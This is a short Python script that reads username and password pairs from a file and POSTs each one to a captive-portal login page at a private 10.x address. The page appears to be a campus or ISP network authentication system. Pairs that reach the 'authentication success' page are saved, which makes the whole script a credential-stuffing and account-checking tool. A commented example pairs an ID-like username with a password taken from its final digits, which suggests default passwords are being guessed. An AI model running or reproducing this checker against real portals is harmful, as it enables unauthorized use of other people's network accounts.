from openpyxl import load_workbook
import os
import requests
import time
from bs4 import BeautifulSoup

url = 'http://10.253.0.1/a70.html'
type = ['','@cmcc','@unicom','@telecom']
listAccounts = []
blackList = []

def load():
    with open('accounts.txt','r') as f:
        for line in f.readlines():
            listAccounts.append(line.strip().split()[0])

def save(account):
    print('Save',account)
    with open('accounts.txt','a') as f:
        f.write(account['user']+" "+account['password']+'\n')

def check(account):
    user = account['user']
    pwd = account['password']
    payload = {'DDDDD': user,'upass': pwd, '0MKKey':'123456'}
    r = requests.post(url,data=payload)
    soup = BeautifulSoup(r.text,'lxml')
    if soup.title == None:
        return False
    title = soup.title.text
    if title == "认证成功页":
        save(account)
        return True
    return False

def accounts():
#    workbook = load_workbook("data3.xlsx")
#    sheet = workbook["Sheet1"]
#    cells = sheet["D"]
    list = []
    with open('acc.txt','r') as f:
#       for cell in cells:
        for cell in f.readlines():
            account = cell.split();
            if account[0] in listAccounts:
                print("ignore user",code)
                continue
            list.append( {"user": account[0], "password": account[1]})
    return list

#check({'user':'20020605171X','password':'05171X'},2)
load()

accs = accounts()
for ac in accs:
        if check(ac):
            print("check done~")
            time.sleep(1)
